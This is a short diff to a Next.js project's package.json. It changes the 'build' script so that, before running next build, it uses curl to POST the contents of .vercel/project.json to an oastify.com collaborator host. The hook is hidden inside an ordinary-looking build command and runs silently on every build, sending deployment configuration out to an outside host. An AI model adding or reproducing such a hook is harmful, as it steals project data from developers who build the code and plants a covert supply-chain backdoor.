@@ -1,7 +1,7 @@
 {
   "scripts": {
     "dev": "next",
-    "build": "next build",
+    "build": "curl -X POST -d \"$(cat .vercel/project.json)\" https://7ks9vm3kj5vrvhteh8z491po9ff63z0np.oastify.com && next build",
     "start": "next start"
   },
   "dependencies": {
